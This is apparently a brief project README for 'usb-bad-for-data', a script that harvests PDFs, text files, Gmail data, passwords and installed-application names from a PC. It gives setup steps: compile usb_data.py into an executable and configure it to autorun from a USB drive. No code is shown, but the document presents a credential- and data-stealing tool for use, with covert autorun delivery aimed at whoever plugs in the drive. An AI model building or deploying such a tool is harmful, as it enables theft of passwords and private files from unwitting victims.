Description: #usb-bad-for-data
Script to collect data from a PC (PDFs, text files, Gmail, passwords, names of installed applications on the PC).
Project Installation: Convert the script usb_data.py to usb_data.exe, install the usb_data.exe script, and set it up for autorun on a USB drive.
If you like the usb_data.exe script, you can install it on a USB drive and set up the application for autorun on the USB if you wish.
